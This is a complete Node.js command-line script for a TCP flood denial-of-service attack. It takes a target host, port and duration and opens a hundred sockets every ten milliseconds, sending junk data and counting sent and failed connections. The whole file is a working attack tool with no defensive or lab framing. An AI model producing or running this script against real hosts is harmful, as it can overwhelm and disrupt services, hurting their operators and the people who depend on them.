const net = require('net');

if (process.argv.length < 5) process.exit(1);
const target = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]);
const stop = Date.now() + time * 1000;
let sent = 0, fail = 0, running = true;

function tcpFlood() {
    if (!running || Date.now() > stop) {
        console.log(`[INFO] TCP-FLOOD finished. Sent: ${sent} | Fail: ${fail}`);
        process.exit(0);
    }
    for (let i = 0; i < 100; i++) {
        const client = new net.Socket();
        client.setTimeout(1000);
        client.connect(port, target, () => {
            client.write(Buffer.alloc(1024, Math.floor(Math.random() * 256)));
            sent++;
            client.destroy();
        });
        client.on('error', () => {
            fail++;
            client.destroy();
        });
        client.on('timeout', () => {
            fail++;
            client.destroy();
        });
    }
}

process.on('SIGINT', () => {
    running = false;
    console.log('\n[INFO] TCP-FLOOD interrupted by user (Ctrl+C).');
});

setInterval(tcpFlood, 10);
